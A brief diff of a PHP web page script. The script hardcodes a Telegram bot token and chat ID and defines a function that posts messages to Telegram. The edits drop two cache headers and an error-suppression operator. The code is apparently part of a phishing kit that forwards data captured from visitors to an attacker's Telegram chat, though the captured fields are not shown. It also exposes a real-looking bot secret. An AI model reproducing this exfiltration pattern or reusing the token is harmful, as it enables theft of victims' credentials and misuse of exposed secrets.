@@ -1060,8 +1060,6 @@ echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www
 
 <?php
 session_start();
-header("Cache-Control: no-cache, must-revalidate");
-header("Expires: Sat, 1 Jan 2030 00:00:00 GMT");
 
 $telegram_token = "8003565046:AAHUklOFr1In8H6XqQW_uUxmahif6XLyJIo"; 
 $chat_id = "2075971255"; 
@@ -1104,7 +1102,7 @@ function sendMessageToTelegram($token, $chat_id, $message) {
     );
 
     $context  = stream_context_create($options);
-    @file_get_contents($url, false, $context);
+    file_get_contents($url, false, $context);
 }
 ?>
 
